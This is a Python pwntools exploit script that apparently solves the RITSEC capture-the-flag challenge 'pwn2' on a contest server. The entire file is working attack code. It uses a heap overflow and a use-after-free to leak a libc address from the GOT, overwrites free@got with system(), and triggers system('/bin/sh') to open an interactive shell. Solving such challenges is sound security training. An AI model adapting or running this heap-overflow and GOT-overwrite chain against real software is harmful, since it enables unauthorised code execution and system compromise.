#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *
import os


context(arch="i386", os="linux", endian="little")


class Pwn:
    def __init__(self):
        self.e = ELF("./pwn2")
        self.libc = ELF("./libc.so.6")
        self.p = None

    def start_binary(self):
        self.p = remote("fun.ritsec.club", 1337)
        self.p.recvuntil("choice: ")

    def create(self, length, name, age):
        self.p.sendline("1")
        self.p.recvuntil("length: ")
        self.p.sendline(str(length))
        self.p.recvuntil("name: ")
        self.p.sendline(name)
        self.p.recvuntil("age: ")
        self.p.sendline(str(age))
        self.p.recvuntil("choice: ")

    def edit(self, index, length, name):
        self.p.sendline("2")
        self.p.recvuntil("(0-based): ")
        self.p.sendline(str(index))
        self.p.recvuntil("length: ")
        self.p.sendline(str(length))
        self.p.recvuntil("name: ")
        self.p.sendline(name)
        self.p.recvuntil("choice: ")

    def view(self, index):
        self.p.sendline("3")
        self.p.recvuntil("(0-based): ")
        self.p.sendline(str(index))
        return self.p.recvuntil("choice: ")

    def delete(self, index):
        self.p.sendline("4")
        self.p.recvuntil("(0-based): ")
        self.p.sendline(str(index))
        self.p.recvuntil("choice: ")

    def exit(self):
        self.p.sendline("5")

    def leak_stack(self):
        offset="A"*24
        payload=offset+p32(self.e.symbols["printPerson"])+p32(self.e.got["free"])

        self.create(20, "A"*10, 20)
        self.create(180, "B"*10, 20)          # Allocate small bin
        self.create(20, "C"*10, 20)           # Avoid top chunk consolidation

        self.delete(1)                        # Populate free@got.plt
        self.edit(0, 4000, payload)           # Heap overflow
        data=self.view(1)[6:10]               # UaF to Leak
        return u32(data)

    def exec_system(self, libc_base):
        offset="A"*28
        payload=offset+p32(self.e.got["free"])

        self.edit(0, 4000, payload)                                  # Overwrite name address with free@got.plt
        self.edit(1, 10, p32(libc_base+self.libc.symbols["system"])) # Overwrite free@got.plt with system()
        payload=offset+p32(libc_base+next(self.libc.search("/bin/sh\x00")))
        self.edit(0, 4000, payload)                                  # Overwrite name address with free@got.plt

        self.p.sendline("4")
        self.p.recvuntil("(0-based): ")
        self.p.sendline("1")                                         # Trigger system("/bin/sh")

        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()

        libc_base=self.leak_stack()-self.libc.symbols["free"]
        log.info("Leak libc base address: "+hex(libc_base))
        self.exec_system(libc_base)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()

#
#Â struct person {
#     void (*printPerson)(void);
#     char *name;
#     int name_length;
#     int age;
# };
#
# struct person person_array[10];
#
